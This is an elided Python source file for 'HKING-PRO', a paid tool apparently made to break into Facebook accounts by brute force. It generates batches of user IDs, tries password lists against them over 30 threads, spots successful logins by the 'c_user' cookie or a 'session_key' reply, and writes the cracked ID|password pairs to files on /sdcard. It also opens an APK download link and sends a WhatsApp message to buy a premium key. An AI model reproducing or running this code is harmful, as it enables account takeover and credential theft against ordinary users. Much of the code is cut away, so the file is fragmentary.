...
logo=("""\033[1;37m
 ...
 .S    S.    .S_SSSs     sdSSSSSSSbs   .S_sSSs    sdSS_SSSSSSbs  
.SS    SS.  .SS~SSSSS    YSSSSSSSS%S  .SS~YS%%b   YSSS~S%SSSSSP  
S%S    S%S  S%S   SSSS          S%S   S%S   `S%b       S%S       
S%S    S%S  S%S    S%S         S&S    S%S    S%S       S%S       
S%S SSSS%S  S%S SSSS%S        S&S     S%S    d*S       S&S       
S&S  SSS&S  S&S  SSS%S        S&S     S&S   .S*S       S&S       
S&S    S&S  S&S    S&S       S&S      S&S_sdSSS        S&S       
S&S    S&S  S&S    S&S      S*S       S&S~YSY%b        S&S       
S*S    S*S  S*S    S&S     S*S        S*S   `S%b       S*S       
S*S    S*S  S*S    S*S   .s*S         S*S    S%S       S*S       
S*S    S*S  S*S    S*S   sY*SSSSSSSP  S*S    S&S       S*S       
SSS    S*S  SSS    S*S  sY*SSSSSSSSP  S*S    SSS       S*S       
       SP          SP                 SP               SP        
       Y           Y                  Y                Y         
...
----------------------------------------------
 Author    : HAZRAT. HKING
 Github    : HKING313
 Facebook  : MR.HKING.BADRI
 Tool Name : HKING-PRO
 Type type : PAID
 Version   : 1.9.8
----------------------------------------------
 HKING Pro version 1.9.8
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/HKING_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                        ...
                        linex()
                        tks = ("Hi HKING Sir, I Need To Buy Your Paid HKING PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python HKING.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as HKING:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                HKING.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [HKING-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        HKING=session.cookies.get_dict().keys()
                        if "c_user" in HKING:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [HKING-OK] %s | %s'%(ids,pas))
                                open('/sdcard/HKING-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in HKING:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [HKING-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/HKING-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [HKING-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/HKING-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/HKING-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [HKING-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/HKING-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [HKING-OK] '+uid+' | '+pas+'\033[1;97m')
